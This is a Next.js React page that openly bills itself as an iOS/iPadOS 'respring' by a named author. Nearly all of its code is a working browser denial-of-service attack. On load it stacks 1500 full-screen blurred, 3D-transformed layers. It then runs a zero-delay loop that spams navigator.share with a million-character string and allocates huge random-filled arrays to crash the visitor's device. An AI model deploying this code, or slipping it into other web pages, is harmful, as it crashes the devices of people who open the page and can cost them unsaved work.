'use client'
import { useEffect } from 'react';

export default function Home() {
  useEffect(() => {
    const cont = document.getElementById('cont')
    const container = document.createElement('div')
    container.style.cssText = 'perspective: 1px; perspective-origin: 99999999% 99999999%;'
    cont?.appendChild(container)
    for (let i = 0; i < 1500; i++) {
      let d = document.createElement('div');
      d.style.cssText = 'pointer-events: none; position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(1000000px, 1000000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
      container?.appendChild(d);
    }
    setInterval(() => {
      try {
        navigator.share({ title: 'R', text: 'R'.repeat(1000000) });
      } catch(e) {}
      let x = new Uint8Array(2048 * 2048 * 67);
      crypto.getRandomValues(x);
    }, 0);
  })

  return(
    <section className="font relative h-[100vh] flex flex-col items-center gap-2 justify-center bg-black" id='cont'>
      <p className='text-white text-3xl'>A respring made by <a href='https://github.com/neonmodder123' className='text-sky-300'>Neonmodder</a></p>
      <p className='text-xl'>Made for any iOS/iPadOS device. Reload if it's not working for you.</p>
    </section>
  );
}